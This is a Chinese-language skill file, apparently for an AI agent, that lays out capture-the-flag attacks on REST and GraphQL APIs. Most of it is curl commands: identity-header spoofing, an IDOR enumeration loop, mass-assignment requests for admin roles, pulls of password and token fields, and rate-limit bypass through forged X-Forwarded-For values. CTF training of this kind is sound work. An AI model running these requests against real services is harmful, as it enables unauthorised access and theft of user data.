---
name: api-auth-advanced
description: API 认证与授权攻击。Use when the target exposes a REST/GraphQL API with bearer tokens, API keys, object IDs, or role-based functions. Covers trust-boundary abuse (header spoofing, hidden identity fields, rate-limit bypass) and authorization flaws (BOLA/BFLA, mass assignment, hidden fields). Distinct from jwt-attack (token crypto): this is about how the API TRUSTS identity signals and checks object access — often the fastest way to a flag in an API-heavy challenge.
---

# API 认证与授权攻击

## 1. 先摸清 API 的信任边界

```bash
# 枚举接口 + 参数(swagger/openapi/graphql 优先)
curl -s http://TARGET/api/openapi.json | jq
curl -s http://TARGET/openapi.json; curl -s http://TARGET/swagger/
# GraphQL: introspection 拿全 schema(见 graphql-attack skill)
```

**核心问题:API 用什么识别"我是谁"和"我能访问什么"?**
- bearer token → 看 claim(role/org/scope)是否被信任
- API key → 看 key 是否可预测/泄露/可批量
- 请求头(X-User-Id / X-Role / X-Admin / X-Forwarded-For)→ 看是否被后端盲目信任

## 2. Header / 身份伪造(最快)

```bash
# 后端常信任这些头来标识用户/角色/内部请求
curl -H "X-User-Id: 1" -H "X-Role: admin" http://TARGET/api/profile
curl -H "X-Admin: true" -H "X-Is-Admin: 1" http://TARGET/api/admin/flag
curl -H "X-Forwarded-For: 127.0.0.1" http://TARGET/api/internal
curl -H "X-Original-URL: /admin" -H "X-Rewrite-URL: /admin" http://TARGET/api
```
尝试 `X-User`, `X-User-Id`, `X-Org`, `X-Tenant`, `X-Role`, `X-Admin`, `X-Internal`, `X-Api-Key: admin`, 以及把它们放进 cookie/query/body 的变体。

## 3. BOLA / IDOR(对象越权)

```bash
# 对象 ID 直接可枚举 → 遍历拿别人(含 admin/flag)的数据
for i in $(seq 1 200); do curl -s http://TARGET/api/objects/$i | grep -i flag; done
# 嵌套资源 + 隐藏对象
curl -s http://TARGET/api/users/1/invoices/1        # 换成 2,3...
# ID 可能藏在: URL 路径、query、body、header(X-Object-Id)、GraphQL 参数、UUID(可用已知前缀爆破)
```
关键:换自己的 token 去访问别人的对象 ID;或用低权限 token 访问高权限端点(功能级 BFLA:`/api/admin/`, `/api/internal/`, `/api/debug/`)。

## 4. Mass assignment / 隐藏字段

```bash
# 注册/更新接口塞入不该出现的字段 → 提权
curl -X POST http://TARGET/api/users -d '{"name":"x","password":"x","role":"admin","is_admin":true}'
# 读对象时带多余参数触发敏感字段回显
curl -s "http://TARGET/api/user?include=password&fields=token,secret,flag"
```

## 5. Rate limit 绕过(爆破/枚举时)

```bash
# 限流常按 IP 计数 → 换标识绕过
curl -H "X-Forwarded-For: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" ...
# 或批量:一个请求带多个操作(GraphQL batching/aliases, JSON 数组批量)
# 或用不同大小写/编码的路径绕过计数
```

## 6. 纪律

- 先拿 swagger/openapi/introspection 看全接口,再决定打认证还是授权。
- 授权漏洞(BOLA/BFLA)常比认证漏洞快——先试"换 ID"和"塞 role 字段",再碰 JWT crypto。
- 看到 flag 相关的对象名(flag/secret/token/keys)直接 IDOR 遍历 + header 伪造提权。
- 每个响应先 jq 看完整结构,隐藏字段常是拿 flag 的钥匙。
